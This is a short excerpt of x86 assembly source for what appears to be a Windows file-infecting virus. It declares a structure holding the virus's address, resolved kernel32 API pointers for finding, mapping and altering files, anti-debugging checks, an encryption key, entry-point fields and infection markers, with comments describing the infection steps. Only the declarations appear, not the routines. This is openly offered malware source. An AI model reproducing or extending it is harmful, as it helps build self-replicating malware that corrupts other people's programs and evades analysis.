blackystruct             STRUCT
     virus_va               dd     ?
     kernel32               dd     ?
     pCreateFileA           dd     ?
     pCreateFileMappingA    dd     ?
     pMapViewOfFile         dd     ?
     pFindFirstFileA        dd     ?
     pFindNextFileA         dd     ?
     pSetCurrentDirectoryA  dd     ?
     pOutputDebugStringA    dd     ?
     pGlobalAddAtomA        dd     ?
     pGlobalDeleteAtom      dd     ?
     pGlobalFindAtomA       dd     ?
     pCloseHandle           dd     ?
     pUnmapViewOfFile       dd     ?
     pVirtualAllocEx        dd     ?
     pVirtualFreeEx         dd     ?
     pLoadLibraryA          dd     ?
     pExitProcess           dd     ?
     pGetFileSize           dd     ?
     pVirtualProtectEx      dd     ?
     pIsDebuggerPresent     dd     ?
     pGetTickCount          dd     ?
     pMessageBoxA           dd     ?
     payload_buf            dd     ?
     atom                   dd     ?                           ;to delete it after infection
     dizzyptr               dd     ?
     findhandle             dd     ?
     wfdata                 dd     ?
     fd                     dd     ?
     temp                   dd     ?
     memptr                 dd     ?
     fname                  dd     ?
     fsize                  dd     ?
     entrypoint             dd     ?
     entrypointsec          dd     ?
     crypt_key              dd     ?
     virus_memory_va        dd     ?                           ;place where virus is located, VA
     virus_file_raw         dd     ?                           ;start of virus in maped file
     new_copier             dd     ?                           ;have to make new crypted cld/repmovsb
blackystruct             ENDS    

dizzy_struct         STRUCT
       dizzy_start          dd     ?
       dizzy_end            dd     ?
dizzy_struct         ENDS 


signature                   equ    0FFFFFFFFh
invalid                     equ    0DDDDDDDDh           ;file is opened for infection, something went
                                                        ;wrong so mark iu as invalid, maybe cannot be 
                                                        ;disassembled, has small amount of procs or 
                                                        ;packed
section                     equ    4000h                ;12kb
XOR_KEY                     equ    0DEh